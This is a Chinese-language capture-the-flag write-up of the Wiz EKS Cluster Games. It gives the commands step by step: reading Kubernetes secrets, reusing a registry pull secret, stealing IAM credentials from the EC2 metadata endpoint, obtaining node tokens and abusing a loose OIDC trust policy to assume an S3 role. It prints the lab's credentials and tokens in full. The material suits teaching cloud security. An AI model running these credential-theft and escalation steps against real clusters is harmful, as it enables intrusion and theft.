# EKSClusterGame

> You've hacked into a low-privileged AWS EKS pod. Use the web terminal below to find flags across the environment. Each challenge runs in a different Kubernetes namespaces with varying permissions.
>
> All K8s resources are crucial; challenges are based on real EKS misconfigurations and security issues.
>
> Click "Begin Challenge" on your desktop, and for guidance, click the question mark icon for useful cheat sheet.

入口点都是一个低权限的Pod。

## challenge1

```yaml
{
    "secrets": [
        "get",
        "list"
    ]
}
```

直接从secret中读flag即可：

```bash
kubectl get secret log-rotate -o yaml
```



## challenge2

```yaml
{
    "secrets": [
        "get"
    ],
    "pods": [
        "list",
        "get"
    ]
}
```

题目说要首先检查仓库。先查看一下pod：

```bash
kubectl get pod database-pod-2c9b3a4e -o yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    kubernetes.io/psp: eks.privileged
    pulumi.com/autonamed: "true"
  creationTimestamp: "2023-11-01T13:32:05Z"
  name: database-pod-2c9b3a4e
  namespace: challenge2
  resourceVersion: "897497"
  uid: 57fe7d43-5eb3-4554-98da-47340d94b4a6
spec:
  containers:
  - image: eksclustergames/base_ext_image
    imagePullPolicy: Always
    name: my-container
    resources: {}
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-cq4m2
      readOnly: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  imagePullSecrets:
  - name: registry-pull-secrets-780bab1d
  nodeName: ip-192-168-21-50.us-west-1.compute.internal
  preemptionPolicy: PreemptLowerPriority
  priority: 0
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: {}
  serviceAccount: default
  serviceAccountName: default
  terminationGracePeriodSeconds: 30
  tolerations:
  - effect: NoExecute
    key: node.kubernetes.io/not-ready
    operator: Exists
    tolerationSeconds: 300
  - effect: NoExecute
    key: node.kubernetes.io/unreachable
    operator: Exists
    tolerationSeconds: 300
  volumes:
  - name: kube-api-access-cq4m2
    projected:
      defaultMode: 420
      sources:
      - serviceAccountToken:
          expirationSeconds: 3607
          path: token
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
status:
  conditions:
  - lastProbeTime: null
    lastTransitionTime: "2023-11-01T13:32:05Z"
    status: "True"
    type: Initialized
  - lastProbeTime: null
    lastTransitionTime: "2023-11-01T13:32:08Z"
    status: "True"
    type: Ready
  - lastProbeTime: null
    lastTransitionTime: "2023-11-01T13:32:08Z"
    status: "True"
    type: ContainersReady
  - lastProbeTime: null
    lastTransitionTime: "2023-11-01T13:32:05Z"
    status: "True"
    type: PodScheduled
  containerStatuses:
  - containerID: containerd://b427307b7f428bcf6a50bb40ebef194ba358f77dbdb3e7025f46be02b922f5af
    image: docker.io/eksclustergames/base_ext_image:latest
    imageID: docker.io/eksclustergames/base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623
    lastState: {}
    name: my-container
    ready: true
    restartCount: 0
    started: true
    state:
      running:
        startedAt: "2023-11-01T13:32:08Z"
  hostIP: 192.168.21.50
  phase: Running
  podIP: 192.168.12.173
  podIPs:
  - ip: 192.168.12.173
  qosClass: BestEffort
  startTime: "2023-11-01T13:32:05Z"
```

里面有一个imagePullSecrets:registry-pull-secrets-780bab1d，获取一下：

```bash
kubectl get secret registry-pull-secrets-780bab1d -o yaml
apiVersion: v1
data:
  .dockerconfigjson: eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19
kind: Secret
metadata:
  annotations:
    pulumi.com/autonamed: "true"
  creationTimestamp: "2023-11-01T13:31:29Z"
  name: registry-pull-secrets-780bab1d
  namespace: challenge2
  resourceVersion: "897340"
  uid: 1348531e-57ff-42df-b074-d9ecd566e18b
type: kubernetes.io/dockerconfigjson
```

网上查一下.dockerconfigjson，这个是从私有的镜像仓库或代码仓库拉取镜像来创建 Pod时候用的Secret，base64解码后里面的auth字段base64解密就是用户名和密码。

然后docker login登录：

```bash
docker login -u eksclustergames -p dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo
```

再把镜像拉取下来：

```bash
docker pull docker.io/eksclustergames/base_ext_image
```

之后就是分析镜像的每一层：

```bash
docker history --no-trunc eksclustergames/base_ext_image
IMAGE                                                                     CREATED        CREATED BY                                                                                                                                                            SIZE      COMMENT
sha256:add093cd268deb7817aee1887b620628211a04e8733d22ab5c910f3b6cc91867   12 days ago    CMD ["/bin/sleep" "3133337"]                                                                                                                                          0B        buildkit.dockerfile.v0
<missing>                                                                 12 days ago    RUN sh -c echo 'wiz_eks_challenge{nothing_can_be_said_to_be_certain_except_death_taxes_and_the_exisitense_of_misconfigured_imagepullsecret}' > /flag.txt # buildkit   124B      buildkit.dockerfile.v0
<missing>                                                                 3 months ago   /bin/sh -c #(nop)  CMD ["sh"]                                                                                                                                         0B
<missing>                                                                 3 months ago   /bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in /                                                                      4.26MB
```

找到了flag。



## challenge3

```json
{
    "pods": [
        "list",
        "get"
    ]
}
```

题目提示去探索ECR仓库并且分析镜像的层。一开始也是没什么思路，看了一下Esonhugh的提示才意识到：

> 需要注意的是 **我们当前环境存在于 pod 中，而 pod 存在于 eks 中，也在 aws 上** ，这意味着我们可以尝试探索一下 是否存在 eks 绑定 role 的情况。

看一下Pod：

```bash
kubectl get pod accounting-pod-876647f8 -o yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    kubernetes.io/psp: eks.privileged
    pulumi.com/autonamed: "true"
  creationTimestamp: "2023-11-01T13:32:10Z"
  name: accounting-pod-876647f8
  namespace: challenge3
  resourceVersion: "897513"
  uid: dd2256ae-26ca-4b94-a4bf-4ac1768a54e2
spec:
  containers:
  - image: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
    imagePullPolicy: IfNotPresent
    name: accounting-container
    resources: {}
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-mmvjj
      readOnly: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  nodeName: ip-192-168-21-50.us-west-1.compute.internal
  preemptionPolicy: PreemptLowerPriority
  priority: 0
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: {}
  serviceAccount: default
  serviceAccountName: default
  terminationGracePeriodSeconds: 30
  tolerations:
  - effect: NoExecute
    key: node.kubernetes.io/not-ready
    operator: Exists
    tolerationSeconds: 300
  - effect: NoExecute
    key: node.kubernetes.io/unreachable
    operator: Exists
    tolerationSeconds: 300
  volumes:
  - name: kube-api-access-mmvjj
    projected:
      defaultMode: 420
      sources:
      - serviceAccountToken:
          expirationSeconds: 3607
          path: token
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
status:
  conditions:
  - lastProbeTime: null
    lastTransitionTime: "2023-11-01T13:32:10Z"
    status: "True"
    type: Initialized
  - lastProbeTime: null
    lastTransitionTime: "2023-11-01T13:32:11Z"
    status: "True"
    type: Ready
  - lastProbeTime: null
    lastTransitionTime: "2023-11-01T13:32:11Z"
    status: "True"
    type: ContainersReady
  - lastProbeTime: null
    lastTransitionTime: "2023-11-01T13:32:10Z"
    status: "True"
    type: PodScheduled
  containerStatuses:
  - containerID: containerd://c465d5104e6f4cac49da0b7495eb2f7c251770f8bf3ce4a1096cf5c704b9ebbe
    image: sha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3
    imageID: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
    lastState: {}
    name: accounting-container
    ready: true
    restartCount: 0
    started: true
    state:
      running:
        startedAt: "2023-11-01T13:32:11Z"
  hostIP: 192.168.21.50
  phase: Running
  podIP: 192.168.5.251
  podIPs:
  - ip: 192.168.5.251
  qosClass: BestEffort
  startTime: "2023-11-01T13:32:10Z"
```

里面的镜像是`688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01`，ecr是aws的一个docker镜像仓库。尝试pull但是提示需要token。

尝试读一下元数据看看有没有iam，发现存在：

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole
{"AccessKeyId":"ASIA2AVYNEVMQ2WBGT6N","Expiration":"2023-11-14 07:32:15+00:00","SecretAccessKey":"QgIPWazFQ7rylSjiEFubQcy4qzPUt9cmCC8CmlMl","SessionToken":"FwoGZXIvYXdzECAaDPiezyHJXJrgVozTXiK3AZJxPjm8mB612LMr2Qn97gyhNRyBX8xEtuOLwy3dQEA2wWt1zYAjHxaKyXwNzjT5fJ9Ir4dmY7gO/BgIsFtm46jT4Q9psX/iJ1iLwNZqvOApZwwiCnyNUi9TfvZzPjeN0AofeZylZSwHe3gQst1FAP+1ti4ptKeDWROQzO8W3joGCTea9hinB9Rhw89XLXoVyez8+bnuKbNIPxXeWY1TxehD59lcdkqYmWiodX0Z/DT5Z2r4llvTmSjvqMyqBjItZmwreEEN4oTPk67KKJ6OkzWzIGz5vyNHd5xMSjTCtvs1Xpew0trbv0u7hzSS"}
```

配置好之后尝试一些ecr的命令，使用`aws ecr get-login-password`可以成功。

网上查一下利用：

```bash
aws ecr get-login-password| docker login --username AWS --password-stdin 688655246681.dkr.ecr.us-west-1.amazonaws.com
```

然后拉取镜像并分析，得到flag：

```bash
docker pull 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b0
docker history --no-trunc 575a75bed1bd
IMAGE                                                                     CREATED        CREATED BY                                                                                                                                                                                                                                                                                             SIZE      COMMENT
sha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3   12 days ago    CMD ["/bin/sleep" "3133337"]                                                                                                                                                                                                                                                                           0B        buildkit.dockerfile.v0
<missing>                                                                 12 days ago    RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{the_history_of_container_images_could_reveal_the_secrets_to_the_future} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit   0B        buildkit.dockerfile.v0
<missing>                                                                 3 months ago   /bin/sh -c #(nop)  CMD ["sh"]                                                                                                                                                                                                                                                                          0B
<missing>                                                                 3 months ago   /bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in /                                                                                                                                                                                                       4.26MB

```

## challenge4

> You're inside a vulnerable pod on an EKS cluster. Your pod's service-account has no permissions. Can you navigate your way to access the EKS Node's privileged service-account?
>
> Please be aware: Due to security considerations aimed at safeguarding the CTF infrastructure, the node has restricted permissions

kubectl是没权限了，看一下`env`发现配置了aksk，配置好看一下whoami：

```bash
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"
}
```

接下来就是知识盲区了。

根据https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-post-exploitation/aws-eks-post-exploitation

里面提到的Connect to AWS Kubernetes Cluster，有两种方法。

第一种方法是：

```bash
aws eks update-kubeconfig --region region-code --name my-cluster
```

这样可以更新或者创建kubeconfig在`~/.kube/config`，用于配置 kubectl 命令行工具与 Amazon EKS 集群通信。之所以要这样做猜测是因为aws的role是NodeInstanceRole，因此其可能对应于EKS集群中的node的权限，而我们的kubectl拥有的只是一个pod中的无权限，因此利用`update-kubeconfig`来得到对应Node权限的`~/.kube/config`，就相当于获得了`Node's privileged service-account`。但是这需要`describeCluster`权限，因此要用第二个方法。

第二种方法是：

```bash
aws eks get-token --cluster-name <cluster_name>
```

这一步获取的token用于与Amazon EKS Cluster认证。使用方法是：

```bash
kubectl --token "xxx"
```



因此利用流程：

```bash
aws eks get-token --cluster-name eks-challenge-cluster
{
    "kind": "ExecCredential",
    "apiVersion": "client.authentication.k8s.io/v1beta1",
    "spec": {},
    "status": {
        "expirationTimestamp": "2023-11-14T08:37:00Z",
        "token": "k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1HZXRDYWxsZXJJZGVudGl0eSZWZXJzaW9uPTIwMTEtMDYtMTUmWC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BU0lBMkFWWU5FVk0ySExQQzdKMyUyRjIwMjMxMTE0JTJGdXMtd2VzdC0xJTJGc3RzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyMzExMTRUMDgyMzAwWiZYLUFtei1FeHBpcmVzPTYwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCUzQngtazhzLWF3cy1pZCZYLUFtei1TZWN1cml0eS1Ub2tlbj1Gd29HWlhJdllYZHpFQ0lhREUlMkYwM3lQajJLSnhqVSUyQk84U0szQVpKbTFTUzlVWW14Y2VTcHBOeWZ6SVlDR2tOV2FQM3BMYVByZWdDQ244ZDV5ZThPczJsNFZ4Yzd0RUNKSWNTU2ptd1Z6Qmk4cjRCeEUwQlpEZ29mbjUlMkZKZUNIMUZCNXNXMG9DRjhFSm5INWpobExyOWpmR0pHcElqRVZhMjc0WnklMkJIRCUyRm1YTkdWZU1DYmg3OWt5eUxSNXd4R0QyJTJCUGo3aEYlMkZxT1VoJTJGayUyQjZMeE1ZdiUyQkdlUmk5ZnQyS0UwNGM4bHlwU1EwayUyRlowaHEwdEdGdEVaSDltRnV2dkZxd1IybDBKU2RUdmpReTduVSUyQjFmZFgwajVralNpYjFzeXFCakl0TzdXRTYzV05kVElnNUozM0VDZ09OUThQbFZ0cXV0elpmTVdlTmVJV09SdUdudGhpbmJGb1dCOVJKejliJlgtQW16LVNpZ25hdHVyZT1mNDQ1MWMxY2E2ZDA0N2UxZWY2MWEwYWZlNjExMjg1NGQ4MjAyNzMwMTExMDhjMTMwMWFmOGEzODdmYThjNjgw"
    }
}
```

拿到token后可以先列权限：

```bash
kubectl --token "xx" auth can-i --list
```

然后读取secret即可：

```bash
kubectl --token "xx" get secret node-flag -o yaml
```

## challenge5

> You've successfully transitioned from a limited Service Account to a Node Service Account! Great job. Your next challenge is to move from the EKS to the AWS account. Can you acquire the AWS role of the *s3access-sa* service account, and get the flag?

kubectl给的权限实际看一下只能获得debug-sa的token：

```bash
kubectl get serviceaccounts
NAME          SECRETS   AGE
debug-sa      0         13d
default       0         13d
s3access-sa   0         13d

kubectl auth can-i --list
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs   Resource Names     Verbs
serviceaccounts/token                           []                  [debug-sa]         [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []                 [create]
pods                                            []                  []                 [get list]
secrets                                         []                  []                 [get list]

kubectl get sa debug-sa -o yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  annotations:
    description: This is a dummy service account with empty policy attached
    eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/challengeTestRole-fc9d18e
  creationTimestamp: "2023-10-31T20:07:37Z"
  name: debug-sa
  namespace: challenge5
  resourceVersion: "671929"
  uid: 6cb6024a-c4da-47a9-9050-59c8c7079904
  
  
kubectl get sa -o yaml s3access-sa
apiVersion: v1
kind: ServiceAccount
metadata:
  annotations:
    eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/challengeEksS3Role
  creationTimestamp: "2023-10-31T20:07:34Z"
  name: s3access-sa
  namespace: challenge5
  resourceVersion: "671916"
  uid: 86e44c49-b05a-4ebe-800b-45183a6ebbda
  
```



oidc的策略中指定了aud必须是sts.amazonaws.com。且根据https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse，里面提到：

> This policy is correctly indicating than **only** the **EKS cluster** with **id** `20C159CDF6F2349B68846BEC03BE031B` can assume the role. However, it's not indicting which service account can assume it, which means that A**NY service account with a web identity token** is going to be **able to assume** the role.

**也就是说，这个策略的缺陷在于并没有指定哪个sa可以assume，导致了凡是有web token的sa都可以去assume。**



aud的限制，查一下：

![image-20231114180315084](README.assets/image-20231114180315084.png)

因此这种配置错误的问题在于不该通过指定aud来确定，因为aud都可以伪造，应该通过类似于下面的形势来指定sa：

```bash
"oidc.eks.region-code.amazonaws.com/id/20C159CDF6F2349B68846BEC03BE031B:sub": "system:serviceaccount:default:my-service-account",
```



在create token的时候指定audience即可：

```bash
kubectl create token debug-sa --audience sts.amazonaws.com
eyJhbGciOiJSUzI1NiIsImtpZCI6IjMzZjdjNzEwMTVmMWExZDgzNmQ0MTRmNWFlN2ZjMjY0MDIyYmE2Y2EifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXhwIjoxNjk5OTU3OTc3LCJpYXQiOjE2OTk5NTQzNzcsImlzcyI6Imh0dHBzOi8vb2lkYy5la3MudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vaWQvQzA2MkMyMDdDOEY1MERFNEVDMjRBMzcyRkY2MEU1ODkiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImNoYWxsZW5nZTUiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVidWctc2EiLCJ1aWQiOiI2Y2I2MDI0YS1jNGRhLTQ3YTktOTA1MC01OWM4YzcwNzk5MDQifX0sIm5iZiI6MTY5OTk1NDM3Nywic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNoYWxsZW5nZTU6ZGVidWctc2EifQ.Eqnx-KdWlz2MsXDf0JNEksnzrtB-vHMgqHTixYE-SjAqXl0tgfAHFWLovWvWJd65dotDZAxo5SPwoXRWnl7B5fh6R8JWil1WgShr3qx_wPqiAU4E3ocuAFPJ-QXISxQ8TXr9ZW4LtLk0DCp11uX0A5SkqNxiorrNd1jkPOZ3ejCufTba9Bjn_bzVopzM54xioNKg0SAlI8r3m9OuJv_H97ah8tKx2vN2x2NEiSmVgfPRxuhWSRhefYnYNOKN5Xxt0BoQ7D4ZttWhE17j6M_m7dFq_6g-xRoe34v8xTo5a0m9vhkxB3kJ1fi0Od-CfSUaVgR4PFzXqgTXN5H3vLJsbg

```

之后就是assume：

```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name feng --web-identity-token "xx"

{
    "Credentials": {
        "AccessKeyId": "ASIA2AVYNEVMTFAROQWK",
        "SecretAccessKey": "+ngbC31wBTG/ATdJr++51J6sz0dSGqgIRYLoVpVH",
        "SessionToken": "IQoJb3JpZ2luX2VjEBIaCXVzLXdlc3QtMSJIMEYCIQCu3OcdnYyC+rwOJhY5ubjdEi2eMiWabL2nPN2K8L156gIhAPZpyl+jAXyhVfRwM3yD3wXz9zg4+JeOhG+YNIMcKy7MKrUECFsQABoMNjg4NjU1MjQ2NjgxIgzabGA7PGAeB0eCv2IqkgQstlifeOOz0pRMoxNW2UIQoJxclBu8YymJaUOxVfTEJaqNCOkCRni45f+oelOUARW5ldY3+sdD5xIn4p77e8UFQ4kjuSkm5g1UeIeMtEAcVAKFVABhTNlj7XhUEUT3ShIDHfk4HTjB+FGOJa5Ckxl/ehU7ZxexIsMN6Sgzgq/oi2RgfJAPItf6Koj3SQKbbUPoQ6oPm/Rq6LCMJcd7j7dmhG7tsIlpos1I72T0oWAM6d5v1/wpPiF25ILkLPPUlIOjwXMOG2rsCT5TrkuWAD2wC+NUt4N51tIg2H75jnbuo6C2wbrIQm0bFWEmxAAH0RVZhhKJO0BaOdvB17jorwddymfhtQIJMZRxj49iITYBxhe2h4s9P8mUwwX5WjJZ5+mpMU22NGAW7hOtTRW6/nwodZNMekTskxSqEdxrIc7i1lPTiiQ8vwlbQ2s/bPnwGPefr2B9hKowUZAYi1riVftVS3dUPH/rpLwRvH3kKsPRodOjrmnCPqlYnBXuEhcye/0hn7DbUr9CiwrrtUfbQNJF/p9oTe+dmbzKzOAfe7MhIKLZQWGYv1d/YvlHbxDt1MbDO73s/I391I4vafmIguYwf9QSnF3BxHpsw78kXo4EX7wVWM0qDJQntNCAvCRZC24syn1nyicr36Gy2w2IDMDqpSC3VKP9XA/K8m7cnizIpEBD8OVPxLev+09lAQKgpn6DEzDGh82qBjqUAXCwGLPAPm8RmX67kgjLYQsgMSbobwZHIackti5Q7wMYuCm21esFMIqiBQsnIbMsa8jYblBR4OAXUEuoyV/WVIL4pHW4+Y7oI/ZNMfM8XIT6zfjNPB8umQ0vSlRt/Myj6imGqVmx2r6JUbQPyNwSVTsgDBqwnh1ohiMTJPXlzpVuyVn3B71ZYrfp+WYMQ6TSwvaRbUY=",
        "Expiration": "2023-11-14T10:54:14+00:00"
    },
    "SubjectFromWebIdentityToken": "system:serviceaccount:challenge5:debug-sa",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA2AVYNEVMZEZ2AFVYI:feng",
        "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/feng"
    },
    "Provider": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589",
    "Audience": "sts.amazonaws.com"
}
```

然后获取flag：

``` bash
aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag ./
```

